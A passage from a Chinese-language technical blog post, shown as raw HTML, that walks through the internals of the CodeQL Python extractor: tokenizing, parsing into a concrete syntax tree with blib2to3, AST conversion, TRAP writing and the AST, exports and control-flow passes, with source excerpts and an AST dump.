class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ExtractorPool</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, outdir, archive, proc_count, options, logger: Logger</span>):</span><br><span class="line">    ...</span><br><span class="line">        <span class="variable language_">self</span>.procs = [</span><br><span class="line">            ctx.Process(target=_extract_loop, args=(n+<span class="number">1</span>,) + args + (n == <span class="number">0</span>,)) <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(proc_count)</span><br><span class="line">        ]</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">from_options</span>(<span class="params">options, trap_dir, archive, logger: Logger</span>):</span><br><span class="line">    ...</span><br><span class="line">        <span class="keyword">return</span> ExtractorPool(trap_dir, archive, procs, options, logger)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_extract_loop</span>(<span class="params">proc_id, queue, trap_dir, archive, options, reply_queue, logger: Logger, write_global_data</span>):</span><br><span class="line">...</span><br><span class="line">            extractor = SuperExtractor(options, trap_dir, archive, renamer, logger, diagnostics_writer)</span><br><span class="line">                    imports = extractor.process(unit)</span><br></pre></td></tr></table></figure><p>super_extractor.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SuperExtractor</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process</span>(<span class="params">self, unit</span>):</span><br><span class="line">        <span class="keyword">for</span> extractor <span class="keyword">in</span> <span class="variable language_">self</span>.extractors:</span><br><span class="line">            <span class="variable language_">self</span>.logger.debug(<span class="string">&quot;Trying %s on %s&quot;</span>,extractor.name, unit)</span><br><span class="line">            res = extractor.process(unit)</span><br><span class="line">            <span class="keyword">if</span> res <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">NotImplemented</span>:</span><br><span class="line">                <span class="variable language_">self</span>.logger.debug(<span class="string">&quot;%s extracted by the %s.&quot;</span>, unit, extractor.name)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="/images/pasted-897.png" alt="upload successful"></p><h3 id="2-7-extractors"><a href="#2-7-extractors" class="headerlink" title="2.7 extractors"></a>2.7 extractors</h3><p>Each extractor process runs a loop which extracts files or modules from the queue, one at a time. Each file or module description is passed, in turn, to one of the extractor objects which will either extract it or reject it for the next extractor object to try. Currently the default extractors are:</p><ul><li>Builtin module extractor: Extracts built-in modules like sys.</li><li>Thrift extractor: Extracts Thrift IDL files.</li><li>Python extractor: Extracts Python source code files.</li><li>Package extractor: Extracts minimal information for package folders.</li><li>General file extractor: Any files rejected by the above passes are added to the database as a text blob.</li></ul><p><strong>Python extraction</strong></p><p>The Python extractor is the most interesting of the processes mentioned above. The Python extractor takes a path to a Python file. It emits TRAP to the specified folder and a UTF-8 encoded version of the source to the source archive. It consists of the following passes:</p><ol><li>Ingestion and decoding: Read the contents of the file as bytes, determine its encoding, and decode it to text.</li><li>Tokenizing: Tokenize the source text, including whitespace and comment tokens.</li><li>Parsing: Create a concrete parse tree from the list of tokens.</li><li>Rewriting: Rewrite the concrete parse tree to an AST, annotated with scope, variable information, and locations.</li><li>Write out lexical and AST information as TRAP.</li><li>Generate and emit TRAP for control-flow graphs. This is done one scope at a time to minimize memory consumption.</li><li>Emit ancillary information, like TRAP for comments.</li></ol><p><strong>Template file extraction</strong></p><p>Most Python template languages work by either translating the template into Python or by fairly closely mimicking the behavior of Python. This means that we can extract template files by converting them to the same AST used internally by the Python extractor and then passing that AST to the backend of the Python extractor to determine imports, and generate TRAP files including control-flow information.</p><p>主要是 py_extractor</p><h3 id="2-8-tokenizer"><a href="#2-8-tokenizer" class="headerlink" title="2.8 tokenizer"></a>2.8 tokenizer</h3><p><img src="/images/pasted-899.png" alt="upload successful"></p><p>module.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">PythonSourceModule</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tokens</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>._tokens <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">with</span> timers[<span class="string">&quot;tokenize&quot;</span>]:</span><br><span class="line">                tokenizer = semmle.python.parser.tokenizer.Tokenizer(<span class="variable language_">self</span>._source)</span><br><span class="line">                <span class="variable language_">self</span>._tokens = <span class="built_in">list</span>(tokenizer.tokens())</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._tokens</span><br></pre></td></tr></table></figure><h3 id="2-9-CST"><a href="#2-9-CST" class="headerlink" title="2.9 CST"></a>2.9 CST</h3><p>虽然实现改功能的几个文件名为ast，但是实际上是CST</p><blockquote><ul><li>ast (标准库)<br>生成抽象语法树 (Abstract Syntax Tree, AST)，关注代码的逻辑结构，忽略非逻辑元素（如空格、注释、括号位置）。<br>用途：代码分析、优化、转换（如 Linter、静态检查）、生成字节码。</li><li>blib2to3 (Black 的分支)<br>生成具体语法树 (Concrete Syntax Tree, CST) 或解析树，保留所有原始细节（空格、注释、格式）。<br>用途：代码格式化（如 Black）、保留格式的源码转换（如 2to3 迁移工具）。</li></ul></blockquote><p>__init__.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">tokens, logger</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Given a string with source, return the lib2to3 Node.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> name, grammar <span class="keyword">in</span> GRAMMARS:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> timers[<span class="string">&quot;parse&quot;</span>]:</span><br><span class="line">                cpt = parse_tokens(grammar, tokens)</span><br><span class="line">            <span class="keyword">with</span> timers[<span class="string">&quot;rewrite&quot;</span>]:</span><br><span class="line">                <span class="keyword">return</span> ast.convert(logger, cpt)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">parse_tokens</span>(<span class="params">gr, tokens</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Parse a series of tokens and return the syntax tree.&quot;&quot;&quot;</span></span><br><span class="line">    p = Parser(gr, convert)</span><br><span class="line">    p.setup()</span><br><span class="line">    <span class="keyword">for</span> tkn <span class="keyword">in</span> tokens:</span><br><span class="line">        <span class="built_in">type</span>, value, start, end = tkn</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span> <span class="keyword">in</span> (tokenize.COMMENT, tokenize.NL):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span> == token.OP:</span><br><span class="line">            <span class="built_in">type</span> = grammar.opmap[value]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span> == token.INDENT:</span><br><span class="line">            value = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> p.addtoken(<span class="built_in">type</span>, value, (start, end)):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># We never broke out -- EOF is too soon (how can this happen???)</span></span><br><span class="line">        <span class="keyword">raise</span> parse.ParseError(<span class="string">&quot;incomplete input&quot;</span>,</span><br><span class="line">                               <span class="built_in">type</span>, value, (<span class="string">&quot;&quot;</span>, start))</span><br><span class="line">    <span class="keyword">return</span> p.rootnode</span><br></pre></td></tr></table></figure><p>整体上都用的blib2to3 这个库，为什么没用默认的AST 呢？</p><h4 id="dump-ast"><a href="#dump-ast" class="headerlink" title="dump_ast"></a>dump_ast</h4><p>为了更好理解此处的ast 结构，codeql 也提供了dump_ast.py 脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m semmle.python.parser.dump_ast /Users/m0d9/study/python/codeql-python-extractor/data/python/stubs/six/moves/urllib_robotparser.py --old</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">Module</span><br><span class="line">  body: [</span><br><span class="line">    Import</span><br><span class="line">      names: [</span><br><span class="line">        alias</span><br><span class="line">          value:</span><br><span class="line">            ImportMember</span><br><span class="line">              module:</span><br><span class="line">                ImportExpr</span><br><span class="line">                  level: 0</span><br><span class="line">                  name: &#x27;six&#x27;</span><br><span class="line">                  top: False</span><br><span class="line">              name: &#x27;PY2&#x27;</span><br><span class="line">          asname:</span><br><span class="line">            Name</span><br><span class="line">              variable: Variable(&#x27;PY2&#x27;, None)</span><br><span class="line">              ctx: Store</span><br><span class="line">        alias</span><br><span class="line">          value:</span><br><span class="line">            ImportMember</span><br><span class="line">              module:</span><br><span class="line">                ImportExpr</span><br><span class="line">                  level: 0</span><br><span class="line">                  name: &#x27;six&#x27;</span><br><span class="line">                  top: False</span><br><span class="line">              name: &#x27;PY3&#x27;</span><br><span class="line">          asname:</span><br><span class="line">            Name</span><br><span class="line">              variable: Variable(&#x27;PY3&#x27;, None)</span><br><span class="line">              ctx: Store</span><br><span class="line">      ]</span><br><span class="line">    If</span><br><span class="line">      test:</span><br><span class="line">        Name</span><br><span class="line">          variable: Variable(&#x27;PY2&#x27;, None)</span><br><span class="line">          ctx: Load</span><br><span class="line">      body: [</span><br><span class="line">        Import</span><br><span class="line">          names: [</span><br><span class="line">            alias</span><br><span class="line">              value:</span><br><span class="line">                ImportExpr</span><br><span class="line">                  level: 0</span><br><span class="line">                  name: &#x27;robotparser&#x27;</span><br><span class="line">                  top: False</span><br><span class="line">              asname:</span><br><span class="line">                Name</span><br><span class="line">                  variable: Variable(&#x27;_1&#x27;, None)</span><br><span class="line">                  ctx: Store</span><br><span class="line">          ]</span><br><span class="line">        Assign</span><br><span class="line">          targets: [</span><br><span class="line">            Name</span><br><span class="line">              variable: Variable(&#x27;RobotFileParser&#x27;, None)</span><br><span class="line">              ctx: Store</span><br><span class="line">          ]</span><br><span class="line">          value:</span><br><span class="line">            Attribute</span><br><span class="line">              value:</span><br><span class="line">                Name</span><br><span class="line">                  variable: Variable(&#x27;_1&#x27;, None)</span><br><span class="line">                  ctx: Load</span><br><span class="line">              attr: &#x27;RobotFileParser&#x27;</span><br><span class="line">              ctx: Load</span><br><span class="line">        Delete</span><br><span class="line">          targets: [</span><br><span class="line">            Name</span><br><span class="line">              variable: Variable(&#x27;_1&#x27;, None)</span><br><span class="line">              ctx: Del</span><br><span class="line">          ]</span><br><span class="line">      ]</span><br><span class="line">      orelse: None</span><br><span class="line">    If</span><br><span class="line">      test:</span><br><span class="line">        Name</span><br><span class="line">          variable: Variable(&#x27;PY3&#x27;, None)</span><br><span class="line">          ctx: Load</span><br><span class="line">      body: [</span><br><span class="line">        Import</span><br><span class="line">          names: [</span><br><span class="line">            alias</span><br><span class="line">              value:</span><br><span class="line">                ImportExpr</span><br><span class="line">                  level: 0</span><br><span class="line">                  name: &#x27;urllib.robotparser&#x27;</span><br><span class="line">                  top: False</span><br><span class="line">              asname:</span><br><span class="line">                Name</span><br><span class="line">                  variable: Variable(&#x27;_1&#x27;, None)</span><br><span class="line">                  ctx: Store</span><br><span class="line">          ]</span><br><span class="line">        Assign</span><br><span class="line">          targets: [</span><br><span class="line">            Name</span><br><span class="line">              variable: Variable(&#x27;RobotFileParser&#x27;, None)</span><br><span class="line">              ctx: Store</span><br><span class="line">          ]</span><br><span class="line">          value:</span><br><span class="line">            Attribute</span><br><span class="line">              value:</span><br><span class="line">                Name</span><br><span class="line">                  variable: Variable(&#x27;_1&#x27;, None)</span><br><span class="line">                  ctx: Load</span><br><span class="line">              attr: &#x27;RobotFileParser&#x27;</span><br><span class="line">              ctx: Load</span><br><span class="line">        Delete</span><br><span class="line">          targets: [</span><br><span class="line">            Name</span><br><span class="line">              variable: Variable(&#x27;_1&#x27;, None)</span><br><span class="line">              ctx: Del</span><br><span class="line">          ]</span><br><span class="line">      ]</span><br><span class="line">      orelse: None</span><br><span class="line">  ]</span><br></pre></td></tr></table></figure><h3 id="2-10-Converter"><a href="#2-10-Converter" class="headerlink" title="2.10 Converter"></a>2.10 Converter</h3><p>ast.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">convert</span>(<span class="params">logger, cpt</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Covert concrete parse tree as specified by blib2to3/Grammar.txt</span></span><br><span class="line"><span class="string">    to the AST specified by semmle/python/master.py</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> Convertor(logger).visit(cpt)</span><br></pre></td></tr></table></figure><p>逻辑是将blib2to3 的AST 转成CodeQL 定义的AST 结构</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ParseTreeVisitor</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Standard tree-walking visitor,</span></span><br><span class="line"><span class="string">    using `node.name` rather than `type(node).__name__`</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">visit</span>(<span class="params">self, node, extra_arg=<span class="literal">None</span></span>):</span><br><span class="line">        method = <span class="string">&#x27;visit_&#x27;</span> + node.name</span><br><span class="line">        <span class="keyword">if</span> extra_arg <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(<span class="variable language_">self</span>, method)(node)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(<span class="variable language_">self</span>, method)(node, extra_arg)</span><br></pre></td></tr></table></figure><p>具体实现是在visit_xxx 中</p><h3 id="2-11-生成Trap"><a href="#2-11-生成Trap" class="headerlink" title="2.11 生成Trap"></a>2.11 生成Trap</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_extract_trap_file</span>(<span class="params">self, ast, comments, path</span>):</span><br><span class="line">    writer = TrapWriter()</span><br><span class="line">    file_tag = get_source_file_tag(<span class="variable language_">self</span>.src_archive.get_virtual_path(path))</span><br><span class="line">    writer.write_tuple(<span class="string">u&#x27;py_Modules&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, ast.trap_name)</span><br><span class="line">    writer.write_tuple(<span class="string">u&#x27;py_module_path&#x27;</span>, <span class="string">&#x27;gg&#x27;</span>, ast.trap_name, file_tag)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> ex <span class="keyword">in</span> <span class="variable language_">self</span>.passes:</span><br><span class="line">            <span class="keyword">with</span> timers[ex.name]:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(ex, FlowPass):</span><br><span class="line">                    ex.set_filename(path)</span><br><span class="line">                ex.extract(ast, writer)</span><br><span class="line">        <span class="keyword">with</span> timers[<span class="string">&#x27;lexical&#x27;</span>]:</span><br><span class="line">            <span class="variable language_">self</span>.lexical.extract(ast, comments, writer)</span><br><span class="line">        <span class="keyword">with</span> timers[<span class="string">&#x27;object&#x27;</span>]:</span><br><span class="line">            <span class="variable language_">self</span>.object_pass.extract(ast, path, writer)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="variable language_">self</span>.logger.error(<span class="string">&quot;Exception extracting module %s: %s&quot;</span>, path, ex)</span><br><span class="line">        <span class="variable language_">self</span>.logger.traceback(WARN)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> writer.get_compressed()</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-902.png" alt="upload successful"></p><ul><li>先写文件信息</li><li>之后交由Passes.extract 处理</li></ul><h3 id="2-12-Passes"><a href="#2-12-Passes" class="headerlink" title="2.12 Passes"></a>2.12 Passes</h3><p>Passes 可以简单理解为遍历器</p><ul><li>ASTPass: 遍历所有的AST 结构，保存为Trap</li><li>ExportsPass: __al__ 中的exprorts</li><li>FlowPass: 遍历CFG，保存为Trap，对应API::DataFlow 等之类的</li></ul><h4 id="2-12-1-ASTPass"><a href="#2-12-1-ASTPass" class="headerlink" title="2.12.1 ASTPass"></a>2.12.1 ASTPass</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">class ASTPass(Pass):</span><br><span class="line"></span><br><span class="line">def extract(self, root, writer):</span><br><span class="line">        try:</span><br><span class="line">            self.writer = writer</span><br><span class="line">            if root is None:</span><br><span class="line">                return</span><br><span class="line">            self._emit_variable(ast.Variable(&quot;__name__&quot;, root))</span><br><span class="line">            self._emit_variable(ast.Variable(&quot;__package__&quot;, root))</span><br><span class="line">            # Introduce special variable &quot;$&quot; for use by the points-to library.</span><br><span class="line">            self._emit_variable(ast.Variable(&quot;$&quot;, root))</span><br><span class="line">            writer.write_tuple(u&#x27;py_extracted_version&#x27;, &#x27;gs&#x27;, root.trap_name, get_analysis_major_version())</span><br><span class="line">            self._walk(root, None, 0, root, None)</span><br><span class="line">        finally:</span><br><span class="line">            self.writer = None</span><br><span class="line"></span><br><span class="line">    def _walk(self, node, parent, index, scope, description):</span><br><span class="line">        self._get_walker(node)(node, parent, index, scope, description)</span><br><span class="line">        </span><br><span class="line">    def _get_walker(self, node):</span><br><span class="line">        if isinstance(node, list):</span><br><span class="line">            return self._walk_list</span><br><span class="line">        elif isinstance(node, ast.AstBase):</span><br><span class="line">            return self._walk_node</span><br><span class="line">        else:</span><br><span class="line">            return self._emit_primitive</span><br></pre></td></tr></table></figure><ul><li>list</li><li>基础节点，例如class、Function、Module、alias、arguments等</li><li>原始类型，例如Variable</li></ul><p><img src="/images/pasted-903.png" alt="upload successful"></p><h4 id="2-12-2-ExportsPass"><a href="#2-12-2-ExportsPass" class="headerlink" title="2.12.2 ExportsPass"></a>2.12.2 ExportsPass</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exports_from_ast</span>(<span class="params">node</span>):</span><br><span class="line">    <span class="string">&#x27;Get a list of symbols exported by the module from its ast.&#x27;</span></span><br><span class="line">    <span class="comment">#Look for assignments to __all__</span></span><br><span class="line">    <span class="comment">#If not available at top-level, then check if-statements,</span></span><br><span class="line">    <span class="comment">#but ignore try-except and loops</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">type</span>(node) <span class="keyword">is</span> ast.Module</span><br><span class="line">    exports = __all___from_stmt_list(node.body)</span><br><span class="line">    <span class="keyword">if</span> exports <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> exports</span><br><span class="line">    <span class="comment"># No explicit __all__ assignment so gather global assignments</span></span><br><span class="line">    exports = <span class="built_in">set</span>()</span><br><span class="line">    globals_from_tree(node.body, exports)</span><br><span class="line">    <span class="keyword">return</span> [ ex <span class="keyword">for</span> ex <span class="keyword">in</span> exports <span class="keyword">if</span> <span class="keyword">not</span> is_private_symbol(ex) ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ExportsPass</span>(<span class="title class_ inherited__">Pass</span>):</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extract</span>(<span class="params">self, ast, writer</span>):</span><br><span class="line">        exported = exports_from_ast(ast)</span><br><span class="line">        write_exports(ast, exported, writer)</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-904.png" alt="upload successful"></p><h4 id="2-12-3-FlowPass"><a href="#2-12-3-FlowPass" class="headerlink" title="2.12.3 FlowPass"></a>2.12.3 FlowPass</h4><ul><li>FlowNode: CFG 中的节点</li><li>FlowGraph: CFG 图</li><li>FlowScope: 整个CFG 图</li></ul><h5 id="FlowNode"><a href="#FlowNode" class="headerlink" title="FlowNode"></a>FlowNode</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class FlowNode(object):</span><br><span class="line">    __slots__ = [ &#x27;node&#x27; ]</span><br><span class="line"></span><br><span class="line">    def __init__(self, node):</span><br><span class="line">        self.node = node</span><br><span class="line"></span><br><span class="line">    def __repr__(self):</span><br><span class="line">        if hasattr(self.node, &quot;lineno&quot;):</span><br><span class="line">            return &#x27;FlowNode(%s at %d)&#x27; % (type(self.node), self.node.lineno)</span><br><span class="line">        else:</span><br><span class="line">            return &#x27;FlowNode(%r)&#x27; % self.node</span><br><span class="line"></span><br><span class="line">    def copy(self):</span><br><span class="line">        return FlowNode(self.node)</span><br></pre></td></tr></table></figure><h5 id="FlowGraph"><a href="#FlowGraph" class="headerlink" title="FlowGraph"></a>FlowGraph</h5><p>FlowGraph 有几个重点的field</p><ul><li>pred: dict类型，当存在边x-y,那么则pred[y].add(x)</li><li>succ: 与pred 方向相反</li></ul><p>为了弄清其含义，看看图最重要的两个接口，如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">def</span> <span class="title function_">add_node</span>(<span class="params">self, n</span>):</span><br><span class="line">       <span class="string">&#x27;Add a node to the graph&#x27;</span></span><br><span class="line">       <span class="keyword">if</span> n <span class="keyword">not</span> <span class="keyword">in</span> <span class="variable language_">self</span>.succ:</span><br><span class="line">           <span class="variable language_">self</span>.pred[n] = SmallSet()</span><br><span class="line">           <span class="variable language_">self</span>.succ[n] = SmallSet()</span><br><span class="line">           <span class="variable language_">self</span>.all_nodes.append(n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_edge</span>(<span class="params">self, x, y</span>):</span><br><span class="line">       <span class="string">&#x27;&#x27;&#x27;Add an edge (x -&gt; y) to the graph. Return true if x, y was</span></span><br><span class="line"><span class="string">       previously in graph&#x27;&#x27;&#x27;</span></span><br><span class="line">       <span class="keyword">if</span> x <span class="keyword">in</span> <span class="variable language_">self</span>.succ:</span><br><span class="line">           <span class="keyword">if</span> y <span class="keyword">in</span> <span class="variable language_">self</span>.succ[x]:</span><br><span class="line">               <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           <span class="variable language_">self</span>.add_node(x)</span><br><span class="line">       <span class="variable language_">self</span>.add_node(y)</span><br><span class="line">       <span class="variable language_">self</span>.pred[y].add(x)</span><br><span class="line">       <span class="variable language_">self</span>.succ[x].add(y)</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>use 猜测是SSA 的产物</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 